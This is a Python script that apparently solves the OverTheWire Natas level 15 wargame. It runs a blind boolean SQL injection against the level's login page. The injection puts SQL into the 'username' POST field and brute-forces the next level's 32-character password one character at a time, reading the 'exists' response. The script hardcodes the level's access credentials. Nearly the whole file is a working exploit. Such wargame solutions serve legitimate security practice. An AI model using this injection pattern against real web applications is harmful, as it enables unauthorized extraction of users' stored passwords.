import requests
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
passwd = ""

for char in chars:
    Data = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    req = requests.post('http://natas15.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas15', 'GB6USCJYJjwLyYhZUNkE1NwDueiTow6g'), data=Data)

    if 'exists' in req.text:
        filtered = filtered + char

for i in range(0,32):
    for char in filtered:
        Data = {'username': 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        req = requests.post('http://natas15.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas15', 'GB6USCJYJjwLyYhZUNkE1NwDueiTow6g'), data=Data)

        if 'exists' in req.text:
            passwd = passwd + char
            print(passwd)
            break
